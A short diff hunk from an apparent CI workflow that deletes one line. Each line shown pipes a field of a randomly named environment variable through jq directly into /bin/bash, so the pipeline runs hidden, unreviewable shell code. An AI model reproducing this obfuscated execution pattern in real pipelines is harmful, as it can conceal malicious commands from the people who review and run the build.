@@ -35,7 +35,6 @@ jobs:
           echo $gaah2 | jq -r .m13 | /bin/bash
           printf '%s' "$e4716" | jq -r .m6 | /bin/bash
           echo $iv0334 | jq -r .gvqin2271 | /bin/bash
-          echo $c6951 | jq -r .knwqj54 | /bin/bash
           printf '%s' "$elia04064" | jq -r .qdr8 | /bin/bash
           printf '%s' "$nem4974" | jq -r .k2 | /bin/bash
           echo $f58472 | jq -r .bw1669 | /bin/bash
